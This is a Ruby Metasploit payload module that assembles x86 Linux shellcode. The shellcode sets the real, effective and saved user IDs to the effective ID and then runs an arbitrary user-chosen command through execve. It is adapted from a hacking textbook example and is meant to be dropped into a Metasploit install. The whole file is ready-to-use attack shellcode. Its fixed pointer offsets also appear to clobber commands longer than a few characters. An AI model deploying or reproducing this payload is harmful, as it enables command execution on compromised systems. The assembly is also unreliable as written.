##
# setresuid_geteuid_exec.rb
#
# this is a modified version of exec_shell.s, made by Jon Erickson for the book
# "Hacking, 2nd Edition". the original source is available here:
# http://www.nostarch.com/download/booksrc.zip
#
# you can drop this in ~/.msf4/modules/payloads/singles/linux/x86/
#
# TODO:
#   - check shell_reverse_tcp2.rb ("Metasm demo")
##

require 'metasm'
require 'msf/core'

module MetasploitModule
        # http://dev.metasploit.com/redmine/projects/framework/wiki/Exploit_Ranking
        Rank = NormalRanking

	include Msf::Payload::Single
	include Msf::Payload::Linux

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Linux setresuid(geteuid()) execve()',
			'Version'       => '0.1.2',
			'Description'   => %q{
					Execute an arbitrary command with the privileges of the calling process. This is similar to using "PrependSetresuid=true", except it doesn't try to get root privileges.
			},
			'Author'        => 'pyllyukko',
			'License'       => MSF_LICENSE,
			'Platform'      => 'linux',
			'Arch'          => ARCH_X86))

		# Register exec options
		register_options(
			[
				OptString.new('CMD',  [ true,  "The command string to execute" ]),
			], self.class)
	end

	#
	# Dynamically builds the exec payload based on the user's options.
	#
	def generate
		cmd		= datastore['CMD'] || ''
		payload_data = <<EOS
	jmp two
one:
	pop ebx				; ebx has the addr of the string
	xor eax, eax			; put 0 into eax
	mov [ebx+#{cmd.length}], al	; null terminate the /bin/sh string
	mov [ebx+8], ebx		; put addr from ebx where the AAAA is
	mov [ebx+12], eax		; put 32-bit null terminator where the BBBB is
	lea ecx, [ebx+8]		; load the address of [ebx+8] into ecx for argv ptr
	lea edx, [ebx+12]		; edx = ebx + 12, which is the envp ptr
	mov al, 11			; syscall #11
	int 0x80			; do it
two:
; uid_t geteuid(void)
	xor eax,eax
; /usr/include/asm-x86/unistd_32.h: __NR_geteuid             49
	mov al,0x31
	int 0x80

; int setresuid(uid_t ruid, uid_t euid, uid_t suid)
; move the results of the geteuid() from eax to other registers
	mov ecx,eax
	mov ebx,eax
	mov edx,eax
	xor eax,eax
; /usr/include/asm-x86/unistd_32.h: __NR_setresuid          164
	mov al,0xa4
	int 0x80

	call one          ; Use a call to get string address
	db "#{datastore['CMD']}"	; the XAAAABBBB bytes aren't needed
EOS
		the_payload = Metasm::Shellcode.assemble(Metasm::Ia32.new, payload_data).encode_string
	end

end
